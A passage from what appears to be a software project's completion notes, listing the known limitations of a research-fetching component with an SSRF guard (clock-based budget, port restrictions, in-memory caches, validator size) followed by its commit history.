- **The total fetch budget is read from the injected clock, so it is as honest as the clock** (a broken clock is `BAD_CLOCK`, a refusal). A port that ignores its signal can still outlast it; the guard stops waiting and releases the slot.
  that survives, and the only survivors are the run's own cited sources.
- **The extractor is small.** Pages that hold their text in script, or whose only content sits in `nav`/`aside`/`footer`, yield nothing
  and are refused as having no readable text.
- **The budget is per run and capped at two dollars.** A spend that crosses runs, and a reconciliation with what a provider billed, are a
  later phase; the ledger port is where the owner's cross-run limit attaches.
- **A hung port that ignores its signal still leaks a task.** The guard stops waiting and frees the slot, and the port is told to stop,
  but the core cannot kill a promise.
- **Page ports are narrowed to 80, 443, 8080 and 8443.** Search endpoints have no port rule.
- **In-memory stores.** The page cache and the slot book do not survive a restart. Worst case 51 MB of page text (8 pages per scope,
  64 scopes); the slot book is bounded at 1,024 scopes.
- **The behavioural copy is not the build.** It runs under type stripping with imports rewritten, so `tsc` and the suites cover the real
  build.
- **`CommittedRead` is declared twice** and the internal-suffix list overlaps the broker's (see "Existing code found").
- **The validator is about 2,600 lines**, against its siblings' 1,100 to 1,730 and the 800-line source rule, which it does not apply to. It is
  data and probes, not logic.
- **No robots.txt handling.**

## Commits

- `b430882a` feat(port): cited research with an SSRF guard, readable text and a step-capped loop
- `dd990e06` docs(finish): PROJECTOS-PORT-RESEARCH1A evidence
- `46a2296b` fix(port): answer review round 1 on cited research
- `67d4d527` wip(port): the final round, interrupted by a usage limit; built, tested and kept
- The final fix-round commit `fix(port): …`, which carries this version of the file.
